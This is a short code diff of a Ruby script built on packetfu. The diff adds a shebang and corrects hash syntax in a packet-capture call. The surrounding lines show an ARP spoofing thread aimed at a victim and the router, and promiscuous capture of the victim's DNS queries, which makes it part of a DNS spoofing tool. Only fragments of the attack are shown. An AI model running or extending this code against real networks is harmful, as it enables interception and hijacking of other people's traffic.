@@ -1,3 +1,4 @@
+#!/usr/bin/ruby
 require 'rubygems'
 require 'packetfu'
 require 'thread'
@@ -129,10 +130,10 @@ begin
 	arp_spoof_thread = Thread.new{spoofThread(@arp_packet_target, @arp_packet_router)}
 
 	capture = PacketFu::Capture.new(:iface => @interface, 
-					:start = true, 
-					:promisc = true, 
-					:filter = "src #{@victimIP} and udp port 53",
-					:save = true)
+					:start => true, 
+					:promisc => true, 
+					:filter => "src #{@victimIP} and udp port 53",
+					:save => true)
 
 	puts "Capturing DNS Queries..."
 	capture.stream.each do |packet|
